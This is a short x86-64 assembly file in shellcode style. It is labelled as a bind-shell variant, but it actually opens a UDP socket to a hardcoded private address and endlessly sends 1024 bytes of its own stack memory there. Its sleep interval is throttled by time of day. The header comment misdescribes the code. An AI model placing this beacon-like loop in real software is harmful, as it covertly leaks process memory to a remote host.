; An optimised verison on the bind_shell code
; Build with: nasm -felf64 sendto.nasm -o tmp.o && ld tmp.o -o sendto

global _start
section .text

_start:
	mov rbp, rsp

; Build gettimeofday time
  xor rax, rax
	push rax
	xor rax, rax
	push rax

; Build sleep time
  xor rax, rax
	add eax, 2000
	push rax
	xor rax, rax
	push rax

;struct sockaddr_in {
;        ssin_familya_family_t sin_family;
;        in_port_t sin_port;
;        struct in_addr sin_addr;
;        uint8_t sin_zero[8];
;}
; Build a server sockaddr_in struct on the stack
	xor rax, rax
	push rax ;sin_zero
	add ax, 0x010c ;
	shl rax, 16
	add ax, 0xa8c0 ;sin_addr
	shl rax, 16
	add ax, 0x2710 ;sin_port
	shl rax, 16
	add ax, 2		;sin_family
	push rax

; Create Socket	
	xor rax, rax
	mov rdx, rax
	inc rax
	inc rax
	mov rsi, rax	  	; SOCK_DGRAM (2)
	mov rdi, rax	  	; AF_INET (2)
	add rax, 39	  	; syscall 41
	syscall
	push rax		; Store socket id

_loop:					; send string to a socket, RSI and RDX populated before call    
	mov rdi, [rbp-56]  	; socket id
	lea rsi, [rbp-56]
	shr rsi, 12
	shl rsi, 12
	xor rdx, rdx
	add rdx, 1024
	xor rax, rax    
	mov r10, rax        ; Zero unused params
	xor r9, r9
	add r9, 16
	lea r8, [rbp-48]  	; sockaddr_in struct
	add rax, 44         ; sys_sendto  %rdi=socket, %rsi=buf, %rdx=len, %r10=0, %r8=addr, %r9=addr_len
	syscall

	mov rax, 96; gettimeofday
	lea rdi, [rbp-16]
	mov rsi, 0
	syscall
	mov rax, [rbp-16]  ; get second
	xor rdx, rdx
	mov rbx, 86400 
	div rbx
	mov rax, rdx
	xor rdx, rdx
	mov rbx, 3600
	div rbx
	add rax, 8		; rax = hour

	cmp rax, 24
	jb next0
	sub rax, 24
next0:
	cmp rax, 18
	jb next1
	mov dword [rbp-24], 3000
next1:
	mov rax, 35           ;  sys_nanosleep
	lea rdi, [rbp-32]			;  sleep time
	lea rsi, [rbp-32]     ;  NULL or some timespc space
	syscall
	mov dword [rbp-24], 999999999 ; 操作堆栈内容

	jmp _loop	; loop send


